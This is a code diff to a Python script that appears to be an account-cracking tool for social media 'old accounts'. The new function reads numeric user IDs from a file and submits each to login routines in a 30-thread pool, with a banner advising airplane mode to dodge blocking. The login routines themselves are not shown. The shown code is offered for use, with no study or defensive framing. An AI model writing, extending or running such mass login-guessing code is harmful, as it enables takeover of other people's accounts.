@@ -367,28 +367,60 @@ def BNG_71_():
         BNG_71_()
 
 
-def old_clone():
-    """Menu for selecting old account cloning type."""
+def old_Custom():
+    """Crack IDs from a custom user-provided list file (ids.txt)."""
+    user = []
     ____banner____()
-    print(f"  {M}[{W}A{M}]{C} ──── {G}ALL SERIES")
+    print(f"  {M}[{W}➔{M}]{C} CUSTOM ID LIST CRACKER")
     linex()
-    print(f"  {M}[{W}B{M}]{C} ──── {G}100003/4 SERIES")
+
+    file_path = input(f"  {M}[{W}#{M}]{C} FILE PATH {W}(Enter = ids.txt): {Y}").strip()
+    if not file_path:
+        file_path = 'ids.txt'
+
+    if not os.path.exists(file_path):
+        print(f"\n  {rad}[!] File Not Found: {file_path}{RESET}")
+        print(f"  {G}[!] ids.txt script wali folder mein rakho, har line par 1 ID{RESET}")
+        time.sleep(2)
+        old_clone()
+        return
+
+    with open(file_path, 'r') as f:
+        for line in f:
+            uid = line.strip()
+            if uid and uid.isdigit():
+                user.append(uid)
+
+    if not user:
+        print(f"\n  {rad}[!] No Valid IDs Found In File{RESET}")
+        time.sleep(2)
+        old_clone()
+        return
+
+    print(f"  {M}[{W}✓{M}]{C} TOTAL IDS FOUND {W}: {G}{len(user)}{R}")
+    print(f"  {M}[{W}A{M}]{C} ──── {G}METHOD 1")
+    print(f"  {M}[{W}B{M}]{C} ──── {G}METHOD 2")
     linex()
-    print(f"  {M}[{W}C{M}]{C} ──── {G}2009 SERIES")
-    linex()
-    
-    _input = input(f"  {M}[{W}➔{M}]{C} CHOICE {W}: {Y}").strip()
-    
-    if _input in ('A', 'a', '01', '1'):
-        old_One()
-    elif _input in ('B', 'b', '02', '2'):
-        old_Tow()
-    elif _input in ('C', 'c', '03', '3'):
-        old_Tree()
-    else:
-        print(f"\n  {rad}[!] Choose Valid Option...{RESET}")
+
+    meth = input(f"  {M}[{W}➔{M}]{C} CHOICE {W}(A/B): {Y}").strip().upper()
+
+    if meth not in ('A', 'B'):
+        print(f"\n  {rad}[!] INVALID METHOD SELECTED{RESET}")
         time.sleep(1.5)
-        BNG_71_()
+        old_clone()
+        return
+
+    with tred(max_workers=30) as pool:
+        ____banner____()
+        print(f"  {M}[{W}✓{M}]{C} TOTAL IDs TO CRACK {W}: {G}{len(user)}{W}")
+        print(f"  {M}[{W}!{M}]{Y} USE AIRPLANE MODE FOR BETTER RESULTS{RESET}")
+        linex()
+
+        for uid in user:
+            if meth == 'A':
+                pool.submit(login_1, uid)
+            else:
+                pool.submit(login_2, uid)
 
 
 def old_One():
